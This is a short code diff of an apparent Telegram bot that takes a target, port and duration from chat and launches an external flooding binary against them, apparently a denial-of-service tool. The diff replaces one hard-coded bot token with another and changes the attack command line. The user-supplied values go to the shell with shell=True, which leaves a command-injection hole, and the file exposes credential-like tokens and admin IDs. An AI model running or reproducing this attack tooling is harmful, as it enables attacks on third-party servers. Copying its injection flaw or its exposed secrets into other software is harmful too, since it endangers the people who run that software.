@@ -5,7 +5,7 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7687115306:AAHNnycsXRAtVbpZ6__Ytx2nSwIbH1PJjZc')
+bot = telebot.TeleBot('8130774493:AAHTf_DSTrKFx7d79CjAWkp1qI1kRft7bfs')
 
 # Admin user IDs
 admin_id = {"7083378335", "1291795330"}
@@ -301,7 +301,7 @@ def handle_attack(message):
                     start_attack_reply(message, target, port, time)
 
                     # Simulate attack process
-                    full_command = f"./spyther {target} {port} {time} 1000"
+                    full_command = f"./bgmi {target} {port} {time} 13 1000"
                     subprocess.run(full_command, shell=True)
 
                     response = "Attack completed successfully."
